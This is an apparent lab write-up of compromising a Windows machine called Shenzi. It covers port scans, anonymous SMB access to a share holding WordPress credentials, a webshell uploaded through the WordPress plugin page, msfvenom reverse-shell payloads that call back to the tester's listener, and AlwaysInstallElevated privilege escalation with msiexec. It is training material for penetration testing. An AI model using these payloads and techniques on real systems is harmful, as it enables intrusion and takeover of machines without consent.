---
Alias: Shenzi
Date: {{date}}
Platform: Windows
Difficulty: Intermediate
Tags: #SMBenumeration #WhiteWinterWolfPHPwebshell
Status: Finished
IP:  192.168.142.55
---

# {{Shenzi}}


# Resolution summary
- Utilized smbclient to locate an smb share and found we were able to login as null with no password
- Found a passwords.txt file in the share
- Password.txt file contained wordpress credentials
- As the share was called Shenzi i attempted to navigate to http://192.168.142.55/shenzi and found a wordpress site
- Found an admin link and was directed to an admin login page
- Logged into the admin page with the found credentials in the smb share
- Navigated to upload plugin page
- Uploaded a reverse shell on the plugin page
- Set up a netcat listener on kali machine
- Navigated to  "/wp-content/uploads" as it is a common Wordpress directory to have access to
- Navigated to the folder with the reverse shell
- Clicked on the reverse shell but received no reverse shell
- Created a White Winterwolf Web Shell and uploaded it into the plugin page
- 
- 
- Text

## Improved skills
- Wordpress site/webpage directory guessing
- skill 2

## Used tools
- nmap
- rustscan
- smbclient

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.142.55 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.142.55:21
Open 192.168.142.55:80
Open 192.168.142.55:135
Open 192.168.142.55:139
Open 192.168.142.55:443
Open 192.168.142.55:445
Open 192.168.142.55:3306
Open 192.168.142.55:5040
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 20:45 EDT
Initiating Ping Scan at 20:45
Scanning 192.168.142.55 [2 ports]
Completed Ping Scan at 20:45, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:45
Completed Parallel DNS resolution of 1 host. at 20:45, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:45
Scanning 192.168.142.55 [8 ports]
Discovered open port 80/tcp on 192.168.142.55
Discovered open port 443/tcp on 192.168.142.55
Discovered open port 139/tcp on 192.168.142.55
Discovered open port 135/tcp on 192.168.142.55
Discovered open port 3306/tcp on 192.168.142.55
Discovered open port 445/tcp on 192.168.142.55
Discovered open port 21/tcp on 192.168.142.55
Discovered open port 5040/tcp on 192.168.142.55
Completed Connect Scan at 20:45, 0.08s elapsed (8 total ports)
Nmap scan report for 192.168.142.55
Host is up, received syn-ack (0.082s latency).
Scanned at 2022-07-21 20:45:26 EDT for 0s

PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
80/tcp   open  http         syn-ack
135/tcp  open  msrpc        syn-ack
139/tcp  open  netbios-ssn  syn-ack
443/tcp  open  https        syn-ack
445/tcp  open  microsoft-ds syn-ack
3306/tcp open  mysql        syn-ack
5040/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds


nmap -sC -sV -p 21,80,88,135,139,443,445,3306,5040 192.168.142.55
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 18:33 PDT
Nmap scan report for 192.168.142.55
Host is up (0.080s latency).

PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open     http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.142.55/dashboard/
88/tcp   filtered kerberos-sec
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open     ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.142.55/dashboard/
445/tcp  open     microsoft-ds?
3306/tcp open     mysql?
| fingerprint-strings: 
|   NULL, X11Probe: 
|_    Host '192.168.49.142' is not allowed to connect to this MariaDB server
5040/tcp open     unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=7/21%Time=62D9FE6E%P=aarch64-unknown-linux-gn
SF:u%r(NULL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.142'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11
SF:Probe,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.142'\x20is\x20not\x2
SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-07-22T01:36:18
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.89 seconds

```

Enumerated open TCP ports:
```bash
80
445
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 445 - SMB

#### -Typed "echo exit | smbclient -L \\\\192.168.142.55" and found Shenzi as a share:

![](Pasted%20image%2020221108005630.png)
#SMBenumeration

#### -Typed "smbclient \\\\192.168.142.55\\Shenzi" and hit enter/ left workgroup password blank and was able to gain access to the smb share and found a file named "password.txt":

![](Pasted%20image%2020221108005828.png)


#### -Typed "get password.txt" which downloaded the file to my kali machine

#### -Cat'd the password file and found the following credentials

![](Pasted%20image%2020221108010923.png)

# Port 80 Apache httpd 2.4.43

#### -As the SMB share was named "Shenzi" I navigated to "http://192.168.142.55/shenzi/" and found the following wordpress site:

![](Pasted%20image%2020221108011213.png)

#### - Typed "http://192.168.142.55/shenzi/admin" and was redirected to the following wordpress login page:

![](Pasted%20image%2020221108011314.png)

#### -Logged in with the wordpress credentials found previously (password FeltHeadwallWight357) and navigated to the plugins page:

![](Pasted%20image%2020221108011438.png)



---

# Exploitation
## Upload Web Shell to Wordpress site plugins section


#### -Clicked "add new":

![](Pasted%20image%2020221108095524.png)

#### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=445 -f exe > reverse.exe" to create the reverse shell payload on my kali machine:

![](Pasted%20image%2020221108095611.png)

#### - Started a netcat listener on my kali machine on port 445

#### -Clicked "upload plugin":

![](Pasted%20image%2020221108095717.png)

#### -Clicked "browse" and chose my reverse shell payload on kali machine to upload and clicked "install now":

![](Pasted%20image%2020221108095817.png)

![](Pasted%20image%2020221108095901.png)

![](Pasted%20image%2020221108095931.png)

#### - As I know directory "/wp-content/uploads" is a common directory to have access to, I navigated to it and found the following:

![](Pasted%20image%2020221108100355.png)

#### - Clicked on "2022/"

![](Pasted%20image%2020221108100456.png)

#### -Clicked on "07/"

![](Pasted%20image%2020221108100540.png)

#### -Found my reverse shell payload. Set up a netcat listener on my kali machine listening on port 445 and clicked on the payload

![](Pasted%20image%2020221108100619.png)

#### - I was unable to execute the reverse shell from there so I downloaded a windows webshell found from https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php and typed "whoami" and found we had remote code execution:

![](Pasted%20image%2020221108100715.png)

![](Pasted%20image%2020221108100749.png)
#PHPwebshell 

#### - Typed "dir" and found our payload reverse.exe-.php was in the current directory. Then typed "reverse.exe_.php" and received a reverse shell:

![](Pasted%20image%2020221108100845.png)

![](Pasted%20image%2020221108100919.png)

---

# Privilege Escalation
## Local Enumeration

#### - Downloaded PrivescCheck.ps1 into user Shenzi's directory

#### - Typed powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck" on CMD prompt to run the "PrivescCheck.ps1" script and received the following Report showing "AlwaysInstallElevated" as High:

![](Pasted%20image%2020221108101505.png)

![](Pasted%20image%2020221108101625.png)
#PrivescCheck.ps1

#### - Reviewed the content of the script output and found the value of AlwaysInstallElevated in Local Machine and Current Users keys (also ran WinPeas to confirm this as well):

![](Pasted%20image%2020221108101801.png)

![](Pasted%20image%2020221108103449.png)
#AlwaysInstallElevatedPrivilegeEscalation

#### - Googled "alwayinstallelevated privilege escalation" and found the following webpage showing how to create a reverse shell payload. I typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=443 -f msi > installer.msi" to create the payload on my kali machine:

![](Pasted%20image%2020221108103544.png)

![](Pasted%20image%2020221108103623.png)



## Privilege Escalation vector
## Always Install Elevated Privilege Escalation

#### - Uploaded the reverse shell msi payload onto target machine

#### - Started a netcat listener on kali machine listening on port 443

#### - Per the "Windows Privelege Escalation (alwaysinstalleleveated)" webpage I typed "msiexec /quiet /qn /i [file name]" to run the reverse shell payload onto the target and received a shell running as NT/Authority System:

![](Pasted%20image%2020221108104125.png)

---
